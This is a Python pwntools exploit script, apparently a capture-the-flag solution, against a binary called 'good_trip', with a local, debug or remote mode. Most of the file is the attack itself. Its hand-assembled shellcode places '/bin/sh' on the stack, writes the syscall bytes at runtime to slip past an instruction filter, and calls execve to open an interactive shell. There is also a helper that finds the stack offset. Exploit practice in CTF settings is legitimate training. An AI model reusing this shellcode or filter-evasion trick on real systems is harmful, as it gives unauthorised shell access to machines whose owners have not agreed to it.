#!/usr/bin/python3

from pwn import *
import sys
from ctypes import CDLL

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./good_trip"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
break *exec+64
'''

libcx = CDLL("libc.so.6")
# now = int(floor(time.time()))
# libcx.srand(now)
# print(libcx.rand())

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def unpack_ptr(ptr):
    if (len(ptr) < 8):
        ptr += (8 - len(ptr)) * b"\x00"
    return (u64(ptr))

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

# def craft_shellcode(shellcode, base):
    # code = ""
    # i = 0;
    # injection = base + 200      # shell code will be executed here
    # while (i < len(shellcode)):


def exploit():
    base = 0x1337131000
    log.info("alright")
    pp.recvuntil(b">>")
    pp.sendline(b"0")
    pp.recvuntil(b">>")
    input("gdb >> ")
    payload = asm (
            f"mov rsp, {base + 100};"
            # "push 0x2f62696e2f7368;"
            f"movabs rax, 0x0068732f6e69622f;"
            "mov QWORD PTR [rsp], rax;"
            "mov rdi, rsp;"
            f"mov rsp, {base + 120};"
            "mov QWORD PTR [rsp], 0x0f;"
            "mov QWORD PTR [rsp + 1], 0x05;"
            "mov rax, 0x3b;"
            "mov rdx, 0x0;"
            "mov rsi, 0x0;"
            "jmp rsp;"

            # "mov QWORD PTR [rsp + 4], 0x;"
            )
    pp.sendline(payload)
    pp.interactive()
    

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
